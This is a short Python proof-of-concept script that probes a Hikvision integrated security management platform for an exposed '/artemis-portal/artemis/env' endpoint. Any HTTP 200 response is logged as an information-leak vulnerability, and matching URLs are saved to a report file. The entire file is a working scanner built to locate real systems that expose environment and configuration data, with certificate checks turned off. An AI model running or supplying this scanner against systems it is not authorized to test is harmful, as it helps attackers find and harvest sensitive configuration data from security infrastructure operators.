import requests
import time
import buter

filename = "./reps/hkvs综合安防管理平台env信息泄漏-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
poc = '/artemis-portal/artemis/env'
def hkenvil(url):
    try:
        rep = requests.get(url=url+poc,headers=headers,verify=False,timeout=3)
        if rep.status_code ==200:
            print(buter.colors.GREEN + f"存在hkvs综合安防管理平台env信息泄漏漏洞 url : {url}{poc} " + buter.colors.END)
            f = open(filename,"a+",encoding="utf-8")
            f.write(f"{url}{poc}")
            f.write("\n")
            f.close()

        else:
            print(buter.colors.RED+ f"未发现hkvs综合安防管理平台env信息泄漏 url : {url}" + buter.colors.END)
    except Exception as e:
        print(buter.colors.END + f"ERROR : {e}")
